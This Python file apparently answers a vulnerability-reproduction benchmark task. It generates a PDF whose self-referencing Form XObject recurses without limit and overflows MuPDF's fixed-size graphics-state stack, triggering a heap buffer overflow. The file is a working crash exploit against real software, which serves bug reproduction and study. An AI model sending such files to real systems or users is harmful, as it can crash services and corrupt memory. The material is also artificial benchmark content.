class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        def build_pdf(objects: list[bytes]) -> bytes:
            """
            Assembles a valid PDF file from a list of object bodies.
            Calculates offsets and generates the cross-reference table (xref) and trailer.
            Uses LF as a line separator for compactness, which is compliant with PDF spec.
            """
            header = b'%PDF-1.7\n'
            
            body_parts = []
            offsets = []
            current_pos = len(header)
            
            for i, obj_data in enumerate(objects):
                offsets.append(current_pos)
                obj_part = f'{i+1} 0 obj\n'.encode() + obj_data + b'\nendobj\n'
                body_parts.append(obj_part)
                current_pos += len(obj_part)
                
            body = b''.join(body_parts)
            
            xref_offset = current_pos
            
            xref_table_parts = [b'xref\n']
            xref_table_parts.append(f'0 {len(objects) + 1}\n'.encode())
            xref_table_parts.append(b'0000000000 65535 f \n')
            for offset in offsets:
                xref_table_parts.append(f'{offset:010d} 00000 n \n'.encode())
            xref_table = b''.join(xref_table_parts)

            trailer = f'trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\n'.encode()
            trailer += f'startxref\n{xref_offset}\n'.encode()
            trailer += b'%%EOF'
            
            return header + body + xref_table + trailer

        # The vulnerability is a heap buffer overflow in mupdf's PDF parser
        # (oss-fuzz:42537171), caused by excessive recursion of Form XObjects.
        # Each recursive call pushes a graphics state (gstate) onto a fixed-size
        # stack (FZ_MAX_GSTATE = 32). The vulnerable version lacks a depth check
        # before this push operation, leading to an overflow when the recursion
        # depth exceeds the stack size.
        #
        # This PoC creates a PDF with a Form XObject that refers to itself. When
        # the PDF is parsed, the interpreter enters an infinite recursion,
        # overflowing the gstate stack and triggering the vulnerability.

        # Object 1: Document Catalog
        obj1_catalog = b"<< /Type /Catalog /Pages 2 0 R >>"

        # Object 2: Page Tree
        obj2_pages = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

        # Object 3: Page Object. It references the content stream (Obj 4)
        # and defines the recursive XObject /Fm1 (Obj 5) in its resources.
        obj3_page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /Resources << /XObject << /Fm1 5 0 R >> >> >>"

        # Object 4: Page Content Stream. Initiates the recursion by drawing /Fm1.
        content4 = b"/Fm1 Do"
        # The PDF spec requires a newline after the 'stream' keyword.
        obj4_content = f"<< /Length {len(content4)} >>stream\n{content4.decode()}\nendstream".encode()

        # Object 5: The recursive Form XObject. Its content stream calls itself.
        content5 = b"/Fm1 Do"
        obj5_xobject = f"<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Length {len(content5)} >>stream\n{content5.decode()}\nendstream".encode()
        
        pdf_objects = [
            obj1_catalog,
            obj2_pages,
            obj3_page,
            obj4_content,
            obj5_xobject,
        ]
        
        return build_pdf(pdf_objects)